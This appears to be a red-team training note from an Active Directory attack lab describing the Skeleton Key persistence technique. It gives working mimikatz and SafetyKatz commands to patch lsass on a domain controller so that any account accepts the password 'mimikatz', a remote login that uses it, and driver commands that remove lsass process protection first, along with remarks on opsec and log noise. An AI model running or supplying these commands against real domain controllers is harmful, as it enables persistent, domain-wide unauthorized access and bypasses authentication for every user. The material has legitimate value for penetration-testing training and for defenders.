* Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
*  All the publicly known methods are NOT persistent across reboots.
* Yet again, mimikatz to the rescue.

*  Use the below command to inject a skeleton key (password would bemimikatz) on a Domain Controller of choice. DA privileges required
```
SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

*  Now, it is possible to access any machine with a valid username and password as "mimikatz"
```
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```

Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.

*  In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

* Note that above would be very noisy in logs - Service installation (Kernel
mode driver)
